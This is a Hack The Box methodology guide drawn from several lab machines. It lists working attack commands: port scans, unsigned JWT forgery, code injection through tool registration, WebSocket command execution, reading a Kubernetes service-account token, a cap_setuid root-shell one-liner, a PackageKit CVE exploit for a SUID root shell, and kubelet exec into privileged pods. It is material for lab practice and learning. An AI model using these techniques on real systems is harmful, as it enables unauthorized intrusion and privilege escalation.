# HTB Machine Penetration Testing & Methodology Guide

A structured methodology and attack framework derived from real HTB machine writeups (**Cap**, **Fireflow**, **Nexus**, **Cohort**). This guide outlines standard workflows from initial enumeration to root-level privilege escalation.

---

## Methodology Overview

```
1. Recon & Enumeration -> 2. Initial Access / Web Exploitation -> 3. Privilege Escalation & Breakouts -> 4. Root Flag
```

---

## 1. Initial Reconnaissance & Enumeration

### A. Port Scanning
Always begin with full-port TCP discovery, followed by detailed service scanning:

```bash
# Quick full TCP port scan
sudo nmap -Pn -n -p- --min-rate 5000 <TARGET_IP>

# Targeted service and script enumeration
sudo nmap -Pn -n -sC -sV -p<OPEN_PORTS> <TARGET_IP>
```

### B. Hostname & Subdomain Resolution
If HTTP redirects to a domain (e.g., `https://cohort.htb/`), update your local resolution:

```bash
sudo sh -c 'echo "<TARGET_IP> cohort.htb" >> /etc/hosts'
```

### C. Web Application & API Reconnaissance
- Check network traffic and API endpoints (`POST /api/validate`, `/status`, `/data/`).
- Look for IDOR vulnerabilities (e.g., sequentially requesting packet captures like `/data/0`, `/data/1`).
- Intercept and test internal service endpoints disclosed in API responses (e.g., internal subdomains like `nb-xxxx.cohort.htb` or local ports like `127.0.0.1:5000`).

---

## 2. Web Exploitation & Initial Access

### A. Exposed Credentials & Config Leakage
- Search home directories or web configs for leaked tokens or credentials (e.g., `~/.mcp/config.json` containing service passwords or API endpoints).
- Test SSH access with discovered or default credentials:

```bash
ssh nightfall@<TARGET_IP>
```

### B. JWT & Token Bypass Vectors
- Test for JWT algorithm confusion or missing signatures (`alg: "none"`):
  ```python
  # Unsigned JWT header
  {"alg": "none", "typ": "JWT"}
  ```
- Send forged admin tokens to restricted API endpoints (`/api/v1/tools`).

### C. Dynamic Tool Registration & Command Injection
- If an API permits custom tool or plugin registration, leverage embedded code execution primitives (e.g., registering Python `os.popen()` snippets via MCP tools).

### D. WebSocket RCE & Shell Execution
- Interact with internal WebSockets (`wss://.../terminal/ws`) using `wscat`:

```bash
# Non-interactive / one-shot command execution
wscat -n -c wss://<HOST>/terminal/ws -x $'id; whoami; pwd\n'
```

---

## 3. Post-Exploitation & Internal Enumeration

Once initial access is established:

1. **Grab the User Flag:**
   ```bash
   cat /home/<user>/user.txt
   ```
2. **Environment & Privilege Auditing:**
   - Check local binaries, Linux capabilities (`getcap -r / 2>/dev/null`), and PackageKit versions (`pkcon --version`).
   - Check container service accounts:
     ```bash
     cat /var/run/secrets/kubernetes.io/serviceaccount/token
     ```

---

## 4. Privilege Escalation & Container Breakout

### Vector A: Linux Capabilities (`cap_setuid`)
- Inspect capabilities assigned to system binaries (e.g., `/usr/bin/python3.8 = cap_setuid+ep`).
- Exploit via setuid wrapper:
  ```bash
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```

### Vector B: Local Privilege Escalation (PackageKit Pack2TheRoot — CVE-2026-41651)
- Identify vulnerable PackageKit versions (`<= 1.2.8`).
- Download and execute SUID payload in background when dealing with short-lived interactive shells:
  ```bash
  cd /tmp; nohup ./pack2theroot >/tmp/pk.log 2>&1 &
  ```
- Verify created SUID binary (`/tmp/.suid_bash`) and execute root shell:
  ```bash
  /tmp/.suid_bash -p -c "id; cat /root/root.txt"
  ```

### Vector C: Kubernetes Service Account & Kubelet Exec
- Check service account permissions using SelfSubjectRulesReview API (`nodes/proxy`).
- Identify privileged pods mounting host paths (`/host/root` or `/host`):
  ```json
  {"securityContext": {"privileged": true}, "hostPath": {"path": "/"}}
  ```
- Connect to Kubelet WebSocket API (`wss://<NODE_IP>:10250/exec/...`) with bearer token to execute commands inside the privileged pod.
- Read host root flag directly from `/host/root/root/root.txt`.

---

## Key Lessons & Practical Troubleshooting Tips

1. **Transient Reverse Shells:** If a reverse shell drops immediately, switch to non-interactive single-command invocations (`wscat -x` or single-line cURL payloads).
2. **Background Exploit Polling:** Use `nohup command > log 2>&1 &` for exploits that require background daemon/lock polling (e.g., Pack2TheRoot).
3. **Always Check Host Path Mounts:** In container environments, a privileged pod with hostPath `/` gives instant read/write root access to the underlying node.
